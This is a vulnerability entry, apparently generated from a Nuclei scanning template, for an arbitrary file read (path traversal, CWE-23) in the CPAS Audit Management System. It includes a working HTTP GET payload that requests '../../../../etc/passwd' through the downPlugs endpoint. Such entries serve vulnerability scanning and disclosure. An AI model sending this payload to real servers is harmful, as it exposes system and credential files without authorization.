# Nuclei Template: CPAS Management System - Arbitrary File Read
**Template ID:** cpas-managment-lfi
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`cpas-managment-lfi.yaml`)

## Vulnerability Information & PoC

## Description
The CPAS Audit Management System has been found to contain a vulnerability that allows arbitrary file read. This security flaw can be exploited by attackers to access sensitive files on the server, potentially exposing critical system information. The vulnerability can be triggered by sending a specially crafted HTTP GET request to the endpoint /cpasm4/plugInManController/downPlugs with parameters fileId and fileName, enabling the retrieval of arbitrary files such as /etc/passwd. This issue poses a significant risk to system security and should be addressed immediately to prevent unauthorized access and potential data breaches.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/cpasm4/plugInManController/downPlugs?fileId=../../../../etc/passwd&fileName
```

## References
- https://github.com/wy876/POC/blob/main/%E5%8C%97%E4%BA%AC%E5%8F%8B%E6%95%B0%E8%81%9A%E7%A7%91%E6%8A%80/CPAS%E5%AE%A1%E8%AE%A1%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
